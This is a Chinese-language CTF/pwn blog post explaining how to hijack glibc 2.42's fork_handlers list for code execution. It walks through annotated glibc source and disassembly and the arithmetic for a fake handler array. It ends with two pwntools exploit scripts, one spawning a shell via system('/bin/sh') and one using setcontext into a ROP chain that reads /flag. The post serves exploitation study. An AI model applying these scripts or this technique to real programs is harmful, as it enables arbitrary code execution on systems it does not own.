---
title: 'fork_gadget: glibc 2.42 fork handler 利用技术'
published: 2026-04-20
description: '通过劫持 glibc fork_handlers 结构体实现任意代码执行的利用技术分析'
tags: [Pwn, glibc, fork, exploitation]
category: 'Pwn'
draft: false
---

> 参考：[fork_gadget | Pwn Notes](https://0xa5h.com/pwn/fork_gadget/#fork-one_gadget)

## glibc 2.42

### 结构体

#### fork_handler

```c
/* Elements of the fork handler lists.  */
struct fork_handler {
    // 1. Prepare Handler (fork 之前执行)
    // 这是我们利用漏洞的【核心目标】。
    // 在 fork 系统调用真正发生之前，父进程会执行这个函数。
    // 通常用于获取锁，防止死锁。
    // 攻击利用点：我们将此指针覆盖为 system 或 setcontext。
    void (*prepare_handler) (void);

    // 2. Parent Handler (fork 之后，父进程执行)
    // 在 fork 系统调用返回后，父进程会执行这个函数。
    // 通常用于释放 prepare 阶段获取的锁。
    void (*parent_handler) (void);

    // 3. Child Handler (fork 之后，子进程执行)
    // 在 fork 系统调用返回后，子进程会执行这个函数。
    // 通常用于释放 prepare 阶段获取的锁，并重置子进程的状态。
    void (*child_handler) (void);

    // 4. DSO Handle (动态共享对象句柄)
    // 这是一个指针，用于标识注册这个 handler 的动态库（例如 libc.so, libpthread.so）。
    // 当动态库被卸载时，glibc 会根据这个句柄移除对应的 handler，防止野指针调用。
    // 在漏洞利用中，通常设置为 0 (NULL) 即可。
    void *dso_handle;

    // 5. ID (glibc 2.36+ 新增)
    // 一个唯一的 64 位整数，用于标识这个 handler 条目。
    // 这是 glibc 为了改进 handler 的管理（如排序或校验）而引入的。
    // 攻击利用点：在构造 payload 时，需要按照 0, 1, 2... 的顺序填充这个字段，
    // 或者直接填入非零值，以通过 glibc 的内部检查逻辑。
    uint64_t id;
};
```

#### fork_handler_list

```c
struct DYNARRAY_STRUCT
{
  union
  {
    /* 1. 抽象头：用于多态 */
    struct dynarray_header dynarray_abstract;

    /* 2. 类型安全头：用于具体实现 */
    struct
    {
      /* 这些字段必须与 struct dynarray_header 内存布局完全一致 */
      size_t used;            // 当前数组中已使用的元素数量
      size_t allocated;       // 当前已分配的容量（capacity）
      DYNARRAY_ELEMENT *array; // 指向实际数据数组的指针（类型安全的指针）
    } dynarray_header;
  } u;

#if DYNARRAY_HAVE_SCRATCH
  /* 3. 栈上暂存区 (Small String/Buffer Optimization) */
  /* 如果数组元素很少（小于 DYNARRAY_INITIAL_SIZE），
     数据直接存放在这里，避免 malloc 分配堆内存，提高性能。 */
  DYNARRAY_ELEMENT scratch[DYNARRAY_INITIAL_SIZE];
#endif
};
```

简化后：

```c
struct fork_handler_list {
        size_t used;
        size_t allocated;
        struct fork_handler* array;
        struct fork_handler scratch[48];
};
```

### 相关函数

#### fork

```c
#include <fork.h>
#include <libio/libioP.h>
#include <ldsodefs.h>
#include <malloc/malloc-internal.h>
#include <nss/nss_database.h>
#include <register-atfork.h>
#include <stdio-lock.h>
#include <sys/single_threaded.h>
#include <unwind-link.h>

static void
fresetlockfiles (void)
{
  _IO_ITER i;

  for (i = _IO_iter_begin(); i != _IO_iter_end(); i = _IO_iter_next(i))
    if ((_IO_iter_file (i)->_flags & _IO_USER_LOCK) == 0)
      _IO_lock_init (*((_IO_lock_t *) _IO_iter_file(i)->_lock));
}

pid_t
__libc_fork (void)
{
  bool multiple_threads = !SINGLE_THREAD_P;
  uint64_t lastrun;

  lastrun = __run_prefork_handlers (multiple_threads); //这里

  struct nss_database_data nss_database_data;

  if (multiple_threads)
    {
      call_function_static_weak (__nss_database_fork_prepare_parent,
				 &nss_database_data);

      _IO_proc_file_chain_lock ();
      _IO_list_lock ();

      call_function_static_weak (__malloc_fork_lock_parent);
    }

  pid_t pid = _Fork ();

  if (pid == 0)
    {
      fork_system_setup ();

      if (multiple_threads)
	{
	  __libc_unwind_link_after_fork ();
	  fork_system_setup_after_fork ();
	  call_function_static_weak (__abort_fork_reset_child);
	  call_function_static_weak (__malloc_fork_unlock_child);
	  fresetlockfiles ();
	  _IO_list_resetlock ();
	  _IO_proc_file_chain_resetlock ();
	  call_function_static_weak (__nss_database_fork_subprocess,
				     &nss_database_data);
	}

      __rtld_lock_initialize (GL(dl_load_lock));
      __rtld_lock_initialize (GL(dl_load_tls_lock));
      reclaim_stacks ();

      __run_postfork_handlers (atfork_run_child, multiple_threads, lastrun);
    }
  else
    {
      int save_errno = errno;

      if (multiple_threads)
	{
	  call_function_static_weak (__malloc_fork_unlock_parent);
	  _IO_list_unlock ();
	  _IO_proc_file_chain_unlock ();
	}

      __run_postfork_handlers (atfork_run_parent, multiple_threads, lastrun);

      if (pid < 0)
	__set_errno (save_errno);
    }

  return pid;
}
weak_alias (__libc_fork, __fork)
libc_hidden_def (__fork)
weak_alias (__libc_fork, fork)
```

#### `__run_prefork_handlers`

```c
uint64_t
__run_prefork_handlers (_Bool do_locking)
{
  uint64_t lastrun;

  /* 如果需要锁定（通常是多线程环境），则获取 atfork 锁 */
  if (do_locking)
    lll_lock (atfork_lock, LLL_PRIVATE);

  /* 保存当前的 fork 处理程序计数器，作为本次 fork 操作的截止点 */
  lastrun = fork_handler_counter;

  /* 获取当前注册的 fork 处理程序列表的大小 */
  size_t sl = fork_handler_list_size (&fork_handlers);
  
  /* 从列表末尾向前遍历处理程序 (LIFO 顺序) */
  for (size_t i = sl; i > 0;)
    {
      struct fork_handler *runp
        = fork_handler_list_at (&fork_handlers, i - 1);

      uint64_t id = runp->id;

      if (runp->prepare_handler != NULL)
        {
          if (do_locking)
            lll_unlock (atfork_lock, LLL_PRIVATE);

          runp->prepare_handler (); //利用点

          if (do_locking)
            lll_lock (atfork_lock, LLL_PRIVATE);
        }

      i--;

      while (i > 0
             && fork_handler_list_at (&fork_handlers, i - 1)->id >= id)
        i--;
    }

  return lastrun;
}
```

#### 汇编

```asm
Dump of assembler code for function __run_prefork_handlers:
   0x00007ffff7e8d280 <+0>:     endbr64
   0x00007ffff7e8d284 <+4>:     push   rbp
   0x00007ffff7e8d285 <+5>:     mov    rbp,rsp
   0x00007ffff7e8d288 <+8>:     push   r15
   0x00007ffff7e8d28a <+10>:    mov    r15d,edi
   0x00007ffff7e8d28d <+13>:    push   r14
   0x00007ffff7e8d28f <+15>:    push   r13
   0x00007ffff7e8d291 <+17>:    push   r12
   0x00007ffff7e8d293 <+19>:    push   rbx
   0x00007ffff7e8d294 <+20>:    sub    rsp,0x18
   0x00007ffff7e8d298 <+24>:    test   dil,dil
   0x00007ffff7e8d29b <+27>:    jne    0x7ffff7e8d330 <__run_prefork_handlers+176>
   0x00007ffff7e8d2a1 <+33>:    mov    rdi,QWORD PTR [rip+0x1213d8]        # 0x7ffff7fae680 <fork_handlers>
   0x00007ffff7e8d2a8 <+40>:    mov    r12,QWORD PTR [rip+0x1213b9]        # 0x7ffff7fae668 <fork_handler_counter>
   0x00007ffff7e8d2af <+47>:    test   rdi,rdi
   0x00007ffff7e8d2b2 <+50>:    je     0x7ffff7e8d3b0 <__run_prefork_handlers+304>
   0x00007ffff7e8d2b8 <+56>:    mov    r14,rdi
   0x00007ffff7e8d2bb <+59>:    lea    rbx,[r14-0x1]
=> 0x00007ffff7e8d2bf <+63>:    cmp    rbx,rdi
   0x00007ffff7e8d2c2 <+66>:    jae    0x7ffff7e8d3a8 <__run_prefork_handlers+296>
   0x00007ffff7e8d2c8 <+72>:    mov    rax,QWORD PTR [rip+0x1213c1]        # 0x7ffff7fae690 <fork_handlers+16>
   0x00007ffff7e8d2cf <+79>:    lea    rdx,[rbx+rbx*4]
   0x00007ffff7e8d2d3 <+83>:    lea    rdx,[rax+rdx*8]
   0x00007ffff7e8d2d7 <+87>:    mov    rcx,QWORD PTR [rdx]
   0x00007ffff7e8d2da <+90>:    mov    r13,QWORD PTR [rdx+0x20]
   0x00007ffff7e8d2de <+94>:    test   rcx,rcx
   0x00007ffff7e8d2e1 <+97>:    je     0x7ffff7e8d2f8 <__run_prefork_handlers+120>
   0x00007ffff7e8d2e3 <+99>:    test   r15b,r15b
   0x00007ffff7e8d2e6 <+102>:   jne    0x7ffff7e8d360 <__run_prefork_handlers+224>
   0x00007ffff7e8d2e8 <+104>:   call   rcx
   0x00007ffff7e8d2ea <+106>:   mov    rdi,QWORD PTR [rip+0x12138f]        # 0x7ffff7fae680 <fork_handlers>
   0x00007ffff7e8d2f1 <+113>:   mov    rax,QWORD PTR [rip+0x121398]        # 0x7ffff7fae690 <fork_handlers+16>
   0x00007ffff7e8d2f8 <+120>:   lea    rdx,[r14+r14*4]
   0x00007ffff7e8d2fc <+124>:   lea    rax,[rax+rdx*8-0x30]
   0x00007ffff7e8d301 <+129>:   jmp    0x7ffff7e8d319 <__run_prefork_handlers+153>
   0x00007ffff7e8d303 <+131>:   nop    DWORD PTR [rax+rax*1+0x0]
   0x00007ffff7e8d308 <+136>:   sub    rax,0x28
   0x00007ffff7e8d30c <+140>:   cmp    QWORD PTR [rax+0x28],r13
   0x00007ffff7e8d310 <+144>:   jb     0x7ffff7e8d398 <__run_prefork_handlers+280>
   0x00007ffff7e8d316 <+150>:   mov    rbx,rsi
   0x00007ffff7e8d319 <+153>:   test   rbx,rbx
   0x00007ffff7e8d31c <+156>:   je     0x7ffff7e8d3b0 <__run_prefork_handlers+304>
   0x00007ffff7e8d322 <+162>:   lea    rsi,[rbx-0x1]
   0x00007ffff7e8d326 <+166>:   cmp    rsi,rdi
   0x00007ffff7e8d329 <+169>:   jb     0x7ffff7e8d308 <__run_prefork_handlers+136>
   0x00007ffff7e8d32b <+171>:   call   0x7ffff7e2ab60 <__GI___libc_dynarray_at_failure>
   0x00007ffff7e8d330 <+176>:   xor    eax,eax
   0x00007ffff7e8d332 <+178>:   mov    edx,0x1
   0x00007ffff7e8d337 <+183>:   lock cmpxchg DWORD PTR [rip+0x121321],edx        # 0x7ffff7fae660 <atfork_lock>
   0x00007ffff7e8d33f <+191>:   je     0x7ffff7e8d2a1 <__run_prefork_handlers+33>
   0x00007ffff7e8d345 <+197>:   lea    rdi,[rip+0x121314]        # 0x7ffff7fae660 <atfork_lock>
   0x00007ffff7e8d34c <+204>:   call   0x7ffff7e139a0 <__GI___lll_lock_wait_private>
   0x00007ffff7e8d351 <+209>:   jmp    0x7ffff7e8d2a1 <__run_prefork_handlers+33>
   0x00007ffff7e8d356 <+214>:   cs nop WORD PTR [rax+rax*1+0x0]
   0x00007ffff7e8d360 <+224>:   xor    eax,eax
   0x00007ffff7e8d362 <+226>:   xchg   DWORD PTR [rip+0x1212f8],eax        # 0x7ffff7fae660 <atfork_lock>
   0x00007ffff7e8d368 <+232>:   cmp    eax,0x1
   0x00007ffff7e8d36b <+235>:   jg     0x7ffff7e8d3c2 <__run_prefork_handlers+322>
   0x00007ffff7e8d36d <+237>:   call   QWORD PTR [rdx]
   0x00007ffff7e8d36f <+239>:   xor    eax,eax
   0x00007ffff7e8d371 <+241>:   mov    edx,0x1
   0x00007ffff7e8d376 <+246>:   lock cmpxchg DWORD PTR [rip+0x1212e2],edx        # 0x7ffff7fae660 <atfork_lock>
   0x00007ffff7e8d37e <+254>:   jne    0x7ffff7e8d3da <__run_prefork_handlers+346>
   0x00007ffff7e8d380 <+256>:   mov    rdi,QWORD PTR [rip+0x1212f9]        # 0x7ffff7fae680 <fork_handlers>
   0x00007ffff7e8d387 <+263>:   mov    rax,QWORD PTR [rip+0x121302]        # 0x7ffff7fae690 <fork_handlers+16>
   0x00007ffff7e8d38e <+270>:   jmp    0x7ffff7e8d2f8 <__run_prefork_handlers+120>
   0x00007ffff7e8d393 <+275>:   nop    DWORD PTR [rax+rax*1+0x0]
   0x00007ffff7e8d398 <+280>:   mov    r14,rbx
   0x00007ffff7e8d39b <+283>:   lea    rbx,[r14-0x1]
   0x00007ffff7e8d39f <+287>:   cmp    rbx,rdi
   0x00007ffff7e8d3a2 <+290>:   jb     0x7ffff7e8d2c8 <__run_prefork_handlers+72>
   0x00007ffff7e8d3a8 <+296>:   mov    rsi,rbx
   0x00007ffff7e8d3ab <+299>:   call   0x7ffff7e2ab60 <__GI___libc_dynarray_at_failure>
   0x00007ffff7e8d3b0 <+304>:   add    rsp,0x18
   0x00007ffff7e8d3b4 <+308>:   mov    rax,r12
   0x00007ffff7e8d3b7 <+311>:   pop    rbx
   0x00007ffff7e8d3b8 <+312>:   pop    r12
   0x00007ffff7e8d3ba <+314>:   pop    r13
   0x00007ffff7e8d3bc <+316>:   pop    r14
   0x00007ffff7e8d3be <+318>:   pop    r15
   0x00007ffff7e8d3c0 <+320>:   pop    rbp
   0x00007ffff7e8d3c1 <+321>:   ret
   0x00007ffff7e8d3c2 <+322>:   lea    rdi,[rip+0x121297]        # 0x7ffff7fae660 <atfork_lock>
   0x00007ffff7e8d3c9 <+329>:   mov    QWORD PTR [rbp-0x38],rdx
   0x00007ffff7e8d3cd <+333>:   call   0x7ffff7e13a60 <__GI___lll_lock_wake_private>
   0x00007ffff7e8d3d2 <+338>:   mov    rdx,QWORD PTR [rbp-0x38]
   0x00007ffff7e8d3d6 <+342>:   call   QWORD PTR [rdx]
   0x00007ffff7e8d3d8 <+344>:   jmp    0x7ffff7e8d36f <__run_prefork_handlers+239>
   0x00007ffff7e8d3da <+346>:   lea    rdi,[rip+0x12127f]        # 0x7ffff7fae660 <atfork_lock>
   0x00007ffff7e8d3e1 <+353>:   call   0x7ffff7e139a0 <__GI___lll_lock_wait_private>
   0x00007ffff7e8d3e6 <+358>:   jmp    0x7ffff7e8d380 <__run_prefork_handlers+256>
```

### 流程分析

首先，我们看 `fork_handlers` 全局变量在内存中的样子。它的类型是 `struct fork_handler_list`。

```c
struct fork_handler_list { 
    size_t used;                  // Offset: 0x00 (0)
    size_t allocated;             // Offset: 0x08 (8)
    struct fork_handler* array;   // Offset: 0x10 (16) <-- 关键指针！
    struct fork_handler scratch[48]; // Offset: 0x18 (24) ...
}; 
```

同时，数组中的每个元素是 `struct fork_handler`：

```c
struct fork_handler {
    void (*prepare_handler) (void); // Offset: 0x00
    // ... 其他字段 ...
    uint64_t id;                    // Offset: 0x20
}; // Total Size: 0x28 (40 bytes)
```

我们看 `__run_prefork_handlers` 中的关键指令：

#### 第一步：获取 `used` (RDI)

```asm
mov    rdi, QWORD PTR [rip+0x1213d8]  # 加载 fork_handlers (偏移0x00)
```

- **对应 C 代码**：`rdi = fork_handlers.used`
- **攻击操作**：我们将内存中 `fork_handlers` 的前 8 字节（即 `used`）覆盖为 `/bin/sh` 的地址（记为 `Target_RDI`）。
- **此时寄存器状态**：`rdi = Target_RDI`

#### 第二步：准备循环索引 (RBX)

```asm
mov    r14, rdi       # r14 = used
lea    rbx, [r14-0x1] # rbx = used - 1
```

- **对应逻辑**：glibc 是从后往前遍历数组的，所以第一个要访问的元素的索引是 `used - 1`。
- **此时寄存器状态**：`rbx = Target_RDI - 1`

#### 第三步：获取 `array` 指针 (RAX)

```asm
mov    rax, QWORD PTR [rip+0x1213c1]  # 加载 fork_handlers+16 (偏移0x10)
```

- **对应 C 代码**：`rax = fork_handlers.array`
- **注意**：`0x10` (16) 正好是 `used` (8字节) + `allocated` (8字节) 之后的偏移。
- **攻击操作**：我们将内存中 `fork_handlers + 16` 处覆盖为我们计算出的 `Fake_Array_Base`。
- **此时寄存器状态**：`rax = Fake_Array_Base`

#### 第四步：计算目标地址 (RDX)

```asm
lea    rdx, [rbx+rbx*4] # rdx = rbx * 5
lea    rdx, [rax+rdx*8] # rdx = rax + (rbx * 5) * 8 = rax + rbx * 40
```

- **数学公式**：`rdx = array + index * sizeof(struct fork_handler)`
- **代入我们的值**：

$$
\text{Target\_Addr} = \text{Fake\_Array\_Base} + (\text{Target\_RDI} - 1) \times 40
$$

#### 第五步：调用函数

```asm
mov    rcx, QWORD PTR [rdx] # 读取结构体第一个成员 (prepare_handler)
call   rcx                  # 执行
```

### 攻击计算逻辑 (The Exploit Math)

我们现在是攻击者，我们想要 `call rcx` 最终执行 `system`，且此时 `rdi` 是 `/bin/sh`。

**已知条件**：
1. `Target_RDI` = `/bin/sh` 地址（例如 `0x7ffff7fae780`）。
2. `Real_Payload_Addr` = 我们在内存中实际写入伪造结构体的地方（例如 `0x555555558000`）。
3. `struct size` = 40 (`0x28`)。

**方程**：

我们需要构造一个 `Fake_Array_Base`，使得 glibc 计算出的地址正好指向我们的 Payload。

$$
\text{Fake\_Array\_Base} + (\text{Target\_RDI} - 1) \times 40 = \text{Real\_Payload\_Addr}
$$

**变换求解**：

$$
\text{Fake\_Array\_Base} = \text{Real\_Payload\_Addr} - [(\text{Target\_RDI} - 1) \times 40]
$$

**处理溢出 (Wrap-around)**：

由于 `Target_RDI` 很大，方括号里的乘积会非常大。直接相减会得到负数。
在 64 位系统中，负数是以补码形式存储的，这等价于模运算：

$$
\text{Fake\_Array\_Base} = (\text{Real\_Payload\_Addr} - [(\text{Target\_RDI} - 1) \times 40]) \pmod{2^{64}}
$$

n 代表有几个 handler：

$$
\text{Fake\_Array\_Base} = (\text{Real\_Payload\_Addr} - [(\text{Target\_RDI} - n) \times 40]) \pmod{2^{64}}
$$

### Exploit

#### shell

```python
fork_handlers_offset = 0x23b680 # <--- 修改这里！
fork_handlers_addr = libc.address + fork_handlers_offset

success(f"Target fork_handlers: {hex(fork_handlers_addr)}")

# 1. 查找 /bin/sh 地址作为目标 RDI
rdi_target = next(libc.search(b"/bin/sh\x00"))
success(f"Target RDI (/bin/sh): {hex(rdi_target)}")

# 2. 确定 Payload 存放的真实物理地址
# 我们把伪造的 handler 放在 fork_handlers 后面一点的地方
real_payload_addr = fork_handlers_addr + 0x100
success(f"Real Payload Address: {hex(real_payload_addr)}")

def arbitrary_write(addr, value):
	sla(b"> ", b"1")
	sla(b"Address (hex): ", hex(addr).encode())
	sla(b"Value to write (hex): ", hex(value).encode())
	ru(b"Write done.")

# 3. 构造 Fake Handler 结构体
# struct fork_handler {
#     void (*prepare_handler)(void); <-- 我们写入 system
#     ...
#     uint64_t id; <-- 偏移 0x20
# }
arbitrary_write(real_payload_addr, libc.sym['system'])
# ID 字段 (偏移 32)，填 0 即可
arbitrary_write(real_payload_addr + 32, 0)

# 4. 计算 Fake Array Base (核心数学魔法)
# 汇编逻辑：rdx = (rdi - 1) * 40
# 目标地址 = ArrayBase + rdx
# 所以：ArrayBase = (目标地址 - rdx) % 2^64
offset = (rdi_target - 1) * 40
fake_array_base = (real_payload_addr - offset) % (1<<64)
success(f"Calculated Fake Array Base: {hex(fake_array_base)}")

# 5. 实施攻击
# 写入 fork_handlers.used (将被加载到 RDI)
arbitrary_write(fork_handlers_addr, rdi_target)

# 写入 fork_handlers.array (指向我们的 Fake Base)
# 注意：fork_handlers 结构体中，used 是偏移 0，allocated 是偏移 8，array 是偏移 16
arbitrary_write(fork_handlers_addr + 16, fake_array_base)
```

#### orw

```python
fork_handlers_offset = 0x23b680 
    fork_handlers_addr = libc.address + fork_handlers_offset
    success(f"Target fork_handlers: {hex(fork_handlers_addr)}")

    ctx_addr = fork_handlers_addr + 0x200
    success(f"Context Address (RDI target): {hex(ctx_addr)}")

    real_payload_addr = fork_handlers_addr + 0x8 #存放prepare_handler的地址

    num_handlers = 2
    offset = (ctx_addr - num_handlers) * 40
    fake_array_base = (real_payload_addr - offset) % (1<<64)
    success(f"Calculated Fake Array Base: {hex(fake_array_base)}")

    payload = b""
    payload += p64(ctx_addr)        # +0x00: used
    payload += p64(libc.sym['setcontext'])               # +0x08: allocated && prepare_handler
    payload += p64(fake_array_base) # +0x10: array ptr && parent, child, dso
    payload += p64(0) * 2                  # parent, child, dso
    payload += p64(0)                      # id = 0
    payload += p64(libc.sym['gets'])       # prepare_handler
    payload += p64(0) * 3                  # parent, child, dso
    payload += p64(1)                      # id = 1

    s(p64(fork_handlers_addr) + p64(len(payload)))
    pause()
    s(payload)


    rop = ROP(libc)
    ret = rop.find_gadget(["ret"])[0]
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
    pop_rsi = rop.find_gadget(["pop rsi", "ret"])[0]
    pop_rax = rop.find_gadget(["pop rax", "ret"])[0]
    syscall = rop.find_gadget(["syscall", "ret"])[0]

    flag_str_addr = ctx_addr + 0x400 
    
    chain = flat([
        # openat(0,"flag", 0)
        pop_rdi, 0,
        pop_rsi, flag_str_addr,
        pop_rax, constants.SYS_openat,
        syscall,
        
        # read(3, flag_str_addr, 0x100)
        pop_rdi, 3, # fd
        pop_rsi, flag_str_addr, # buf
        pop_rax, constants.SYS_read,
        syscall,
        
        # write(1, flag_str_addr, 0x100)
        pop_rdi, 1, # fd
        pop_rax, constants.SYS_write,
        syscall
    ])
    

    ucontext_len = len((build_ucontext(0,0)))
    rop_start_addr = ctx_addr + ucontext_len
    
    ucontext = build_ucontext(rsp=rop_start_addr, rip=ret, rdx=0x100) 
    payload2 = b''
    payload2 += ucontext
    payload2 += chain
    payload2 = payload2.ljust(0x400, b'\x00') 
    payload2 += b"/flag\x00"
    
    if b'\n' in payload2:
        log.warning("Payload contains newline! gets() might truncate it.")

    pause()
    sl(payload2)
```
